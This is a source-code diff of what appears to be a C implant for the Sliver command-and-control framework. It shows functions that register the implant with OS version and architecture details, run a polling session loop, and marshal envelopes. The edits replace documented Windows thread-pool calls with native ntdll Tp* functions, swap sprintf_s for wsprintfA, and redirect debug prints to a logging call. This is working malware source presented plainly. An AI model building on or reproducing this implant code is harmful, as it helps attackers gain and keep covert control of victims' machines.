@@ -25,7 +25,7 @@ VOID FreeSliverThreadPool
 {
 	if (pSliverPool != NULL) {
 		if (pSliverPool->pPool != NULL) {
-			CloseThreadpool(pSliverPool->pPool);
+			TpReleasePool(pSliverPool->pPool);
 		}
 
 		FREE(pSliverPool);
@@ -39,7 +39,7 @@ PSLIVER_THREADPOOL InitializeSliverThreadPool()
 
 	pResult = ALLOC(sizeof(SLIVER_THREADPOOL));
 	pResult->pPool = CreateThreadpool(NULL);
-	SetThreadpoolThreadMaximum(pResult->pPool, 8);
+	TpSetPoolMaxThreads(pResult->pPool, 8);
 	SetThreadpoolCallbackPool(&pResult->CallBackEnviron, pResult->pPool);
 	pCleanupGroup = CreateThreadpoolCleanupGroup();
 	SetThreadpoolCallbackCleanupGroup(&pResult->CallBackEnviron, pCleanupGroup, NULL);
@@ -106,7 +106,7 @@ PBYTE RegisterSliver
 	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
 	GetNativeSystemInfo(&SystemInfo);
 	lpVersion = ALLOC(0x100);
-	sprintf_s(lpVersion, 0x100, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
+	wsprintfA(lpVersion, "%d build %d", OsVersion.dwMajorVersion, OsVersion.dwBuildNumber);
 	if (SystemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
 		lstrcatA(lpVersion, " x86_64");
 		lpArch = DuplicateStrA("amd64", 0);
@@ -303,7 +303,7 @@ VOID SessionMainLoop
 			continue;
 		}
 
-		wprintf(L"Receive Envelope:\n");
+		LogError(L"Receive Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
 		pWrapper->pSliverClient = pSliverClient;
@@ -314,7 +314,7 @@ VOID SessionMainLoop
 			goto CLEANUP;
 		}
 
-		SubmitThreadpoolWork(pWork);
+		TpPostWork(pWork);
 		Sleep(pSliverClient->dwPollInterval * 1000);
 	}
 
@@ -344,11 +344,11 @@ BOOL WriteEnvelope
 	}
 
 	if (pEnvelope->pData != NULL) {
-		wprintf(L"Write Envelope:\n");
+		LogError(L"Write Envelope:\n");
 		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
 	}
 	else {
-		wprintf(L"Write Envelope: []\n");
+		LogError(L"Write Envelope: []\n");
 	}
 
 	pMarshalledEnvelope = MarshalEnvelope(pEnvelope);
